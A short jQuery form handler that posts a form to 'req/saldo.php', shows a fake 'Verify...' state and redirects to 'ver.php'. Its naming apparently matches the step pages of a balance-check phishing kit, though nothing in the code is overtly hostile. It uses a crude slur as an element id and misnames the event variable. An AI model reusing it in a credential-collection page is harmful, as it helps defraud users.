$(document).ready(function(){
    $('#formsal').submit(function(e) {
    event.preventDefault();
    $('.load').fadeIn();
document.getElementById('kirim').innerHTML = "Verify...";

$("#lonte").show();
 $.ajax({
 type: 'POST',
 url: 'req/saldo.php',
 data: $(formsal).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            
            console.log('Complete')
   setTimeout(function(){
  window.location.href='ver.php'
  $("#lonte").hide();
  document.getElementById('kirim').innerHTML = "Benar";
  $('.load').fadeOut();
    }, 500);
        }
    });
 });
    return false;
});   
     
